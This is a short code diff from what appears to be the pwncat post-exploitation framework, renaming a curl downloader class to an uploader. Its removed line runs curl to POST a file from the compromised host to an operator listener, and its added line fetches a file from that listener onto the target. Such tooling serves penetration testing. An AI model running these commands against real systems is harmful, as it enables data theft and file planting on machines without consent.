@@ -2,10 +2,10 @@
 from typing import Generator
 import shlex
 
-from pwncat.downloader.base import HTTPDownloader, DownloadError
+from pwncat.uploader.base import HTTPUploader
 
 
-class CurlDownloader(HTTPDownloader):
+class CurlUploader(HTTPUploader):
 
     NAME = "curl"
     BINARIES = ["curl"]
@@ -18,4 +18,4 @@ class CurlDownloader(HTTPDownloader):
         curl = self.pty.which("curl")
         remote_path = shlex.quote(self.remote_path)
 
-        self.pty.run(f"{curl} -X POST --data @{remote_path} http://{lhost}:{lport}")
+        self.pty.run(f"{curl} --output {remote_path} http://{lhost}:{lport}")
